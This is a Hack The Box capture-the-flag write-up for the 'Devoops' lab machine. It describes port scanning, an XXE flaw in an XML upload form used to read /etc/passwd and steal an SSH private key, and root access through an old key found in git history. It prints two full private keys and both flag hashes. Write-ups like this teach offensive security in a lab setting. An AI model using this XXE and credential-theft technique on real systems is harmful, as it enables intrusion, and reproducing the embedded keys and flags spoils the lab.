# Devoops
>Author : Xyan1d3
>Date : 18th July 2021
>IP : 10.10.10.91
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sun Jul 18 13:59:32 2021 as: nmap -sC -sV -v -oN nmap/devoops 10.10.10.91
Nmap scan report for 10.10.10.91
Host is up (0.071s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web Enumeration
We visit the site and find out that it leaks an hostname.
![[Pasted image 20210718140408.png]]

We do a `gobuster` on the page and find out an hidden directory called `/upload/`.
![[Pasted image 20210718153720.png]]

- XXE ??
We could now upload an `XML` file with the tags to see if it works.
![[Pasted image 20210718154014.png]]

We see that it works normally as expected but, now we may check for `XXE`.
![[Pasted image 20210718154156.png]]

And, Infact it is vulnerable.
We could now change it to `SYSTEM` and get the `/etc/passwd`.
![[Pasted image 20210718154434.png]]

## XXE leaked `/etc/passwd` file : 
```
root:x:0:0:root:/root:/bin/bash

*** SNIP ***

usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false
```

We see that we have a user named `roosa`. So, We may try to extract the `SSH` private key of the user.
![[Pasted image 20210718154812.png]]
It works and now we have the private key.

```txt
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----

```

# Initial FootHold as roosa
We could now use the SSH Private Key of `roosa` and get a shell on the box.
![[Pasted image 20210718155218.png]]
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/devoops]
└──╼ # ssh -i roosa.pem roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Sun Jul 18 06:21:50 2021 from 10.10.14.22
roosa@gitter:~$ whoami
roosa
```

## Getting the User Flag
```python
roosa@gitter:~$ ls -l
total 68
drwxrwxr-x 4 roosa roosa 4096 Mar 26 08:11 deploy
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Desktop
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Documents
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Downloads
-rw-r--r-- 1 roosa roosa 8980 Mar 19  2018 examples.desktop
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Music
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Pictures
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Public
-rwxrw-r-- 1 roosa roosa  147 Mar 26  2018 run-blogfeed.sh
-rw-rw-r-- 1 roosa roosa 1839 Mar 26  2018 service.sh
-rw-rw-r-- 1 roosa roosa 2206 Mar 26  2018 service.sh~
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Templates
-r-------- 1 roosa roosa   33 Mar 26  2018 user.txt
drwxr-xr-x 2 roosa roosa 4096 Mar 26 08:11 Videos
drwxrwxr-x 3 roosa roosa 4096 Mar 26 08:11 work
roosa@gitter:~$ cat user.txt 
c5808e1643e801d40f09ed87cdecc67b
```

# Root Escalation
We do enumeration on the `Work` directory and find out that we have a `.git` directory. Therefore, We may look at the `commit history`.

There is an intersting commit which we can take a look at.
![[Pasted image 20210718160227.png]]
```python
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key
```

We could check what has changed using `git log -p hash`.
![[Pasted image 20210718160443.png]]

We see here that there was an old `SSH Private Key` which was changed to the current key which we used to SSH into `roosa`.

We could extract the old key and try to `SSH` as root.
```txt
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

We try to `SSH` into the box as `root` and we get in.
![[Pasted image 20210718160806.png]]

## Getting the root Flag
```python
root@gitter:~# ls -l
total 4
-r-------- 1 root root 33 Mar 26  2018 root.txt
root@gitter:~# cat root.txt 
d4fe1e7f7187407eebdd3209cb1ac7b3
```